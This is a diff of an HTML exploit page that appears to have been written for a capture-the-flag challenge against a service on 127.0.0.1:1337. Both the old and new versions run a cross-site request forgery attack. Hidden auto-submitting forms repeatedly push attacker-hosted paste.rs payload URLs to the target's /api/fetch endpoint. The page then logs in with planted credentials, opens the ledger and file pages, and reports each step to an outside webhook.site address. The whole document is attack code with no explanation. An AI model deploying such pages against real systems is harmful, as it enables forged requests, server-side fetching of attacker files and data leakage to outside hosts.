@@ -1,63 +1,41 @@
-<!DOCTYPE html><html><head><meta charset="utf-8"></head><body>
-<pre id="l">boot</pre>
+<!DOCTYPE html><html><body><pre id="l">x</pre>
 <script>
-const WH = "https://webhook.site/56bb9b65-25cd-4a20-9fba-579658cf66c6";
+const WH = "https://webhook.site/0c22ee9c-77dc-45ea-9230-36023e3dfa52";
 const T = "http://127.0.0.1:1337";
-const LINK = "https://paste.rs/tOEvD";
-const WRITE = "https://paste.rs/ju2iz";
-const COMBO = "https://paste.rs/pcLfY";
+const TAR = "https://paste.rs/ksiii";
 const log = (m) => {
+  new Image().src = WH + "?m=" + encodeURIComponent(String(m).slice(0, 1200));
   try { document.getElementById("l").textContent += "\n" + m; } catch (e) {}
-  new Image().src = WH + "?m=" + encodeURIComponent(String(m).slice(0, 1400));
 };
-function post(url, name) {
-  const iframe = document.createElement("iframe");
-  iframe.name = name || ("f" + Math.random().toString(36).slice(2));
-  iframe.style.display = "none";
-  document.body.appendChild(iframe);
+function post(url) {
+  const n = "f" + Math.random().toString(36).slice(2);
+  const ifr = document.createElement("iframe");
+  ifr.name = n; ifr.style.display = "none";
+  document.body.appendChild(ifr);
   const f = document.createElement("form");
-  f.method = "POST"; f.action = T + "/api/fetch"; f.target = iframe.name;
+  f.method = "POST"; f.action = T + "/api/fetch"; f.target = n;
   f.enctype = "application/x-www-form-urlencoded";
   const i = document.createElement("input");
   i.type = "hidden"; i.name = "url"; i.value = url;
   f.appendChild(i); document.body.appendChild(f); f.submit();
-  return iframe;
 }
-function postWait(url, ms) {
-  return new Promise(function(resolve) {
-    const name = "f" + Math.random().toString(36).slice(2);
-    const iframe = post(url, name);
-    var done = false;
-    function finish() { if (!done) { done = true; resolve(); } }
-    iframe.onload = finish;
-    setTimeout(finish, ms || 2500);
-  });
-}
-(async function() {
-  log("start");
-  post(LINK); log("link_sent");
-  for (let n = 0; n < 15; n++) {
-    setTimeout(function() { post(WRITE); log("w"+n); }, 30 + n * 80);
-    setTimeout(function() { post(COMBO); log("c"+n); }, 50 + n * 80);
+log("start");
+post(WH + "/probe");
+for (let n = 0; n < 10; n++) setTimeout(function() { post(TAR); log("t" + n); }, n * 200);
+setTimeout(function() { log("ledger"); location.href = T + "/ledger"; }, 4000);
+setTimeout(function() {
+  log("login");
+  const f = document.createElement("form");
+  f.method = "POST"; f.action = T + "/enter"; f.target = "_blank";
+  f.enctype = "application/x-www-form-urlencoded";
+  for (const [k, v] of Object.entries({ username: "pwn", password: "password123" })) {
+    const i = document.createElement("input");
+    i.type = "hidden"; i.name = k; i.value = v; f.appendChild(i);
   }
-  await postWait(LINK, 1500); log("link_waited");
-  post(WRITE); log("write_after_wait");
-  await new Promise(r => setTimeout(r, 500));
-  post(WRITE); log("write2");
-  setTimeout(function() { log("ledger"); location.href = T + "/ledger"; }, 5000);
-  setTimeout(function() {
-    log("login");
-    const f = document.createElement("form");
-    f.method = "POST"; f.action = T + "/enter"; f.target = "_blank";
-    f.enctype = "application/x-www-form-urlencoded";
-    for (const [k,v] of Object.entries({username:"pwn", password:"password123"})) {
-      const i = document.createElement("input"); i.type="hidden"; i.name=k; i.value=v; f.appendChild(i);
-    }
-    document.body.appendChild(f); f.submit();
-  }, 7000);
-  setTimeout(function() { window.open(T + "/ledger", "_blank"); log("ledger2"); }, 9000);
-  setTimeout(function() { window.open(T + "/ledgermaster", "_blank"); log("lm"); }, 10000);
-  setTimeout(function() { window.open(T + "/file", "_blank"); log("filepg"); }, 11000);
-  for (let i = 1; i <= 30; i++) setTimeout(function(){ log("tick"+i); }, i * 2000);
-})();
+  document.body.appendChild(f); f.submit();
+}, 6000);
+setTimeout(function() { window.open(T + "/ledger", "_blank"); log("L2"); }, 8000);
+setTimeout(function() { window.open(T + "/file", "_blank"); log("F"); }, 9000);
+setTimeout(function() { window.open(T + "/ledgermaster", "_blank"); log("LM"); }, 10000);
+for (let i = 1; i <= 20; i++) setTimeout(function() { log("tick" + i); }, i * 2000);
 </script></body></html>
